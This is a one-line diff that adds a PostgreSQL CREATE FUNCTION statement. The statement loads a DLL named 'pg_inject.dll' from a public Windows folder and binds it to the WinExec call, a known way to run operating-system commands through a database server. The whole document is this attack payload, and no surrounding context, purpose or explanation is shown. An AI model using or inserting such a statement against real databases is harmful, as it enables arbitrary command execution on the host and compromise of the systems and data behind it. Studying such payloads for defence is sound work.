@@ -1,0 +1,1 @@
+CREATE OR REPLACE FUNCTION foo(int) RETURNS int AS 'C:\Users\Public\pg_inject.dll', 'WinExec' LANGUAGE C STRICT;
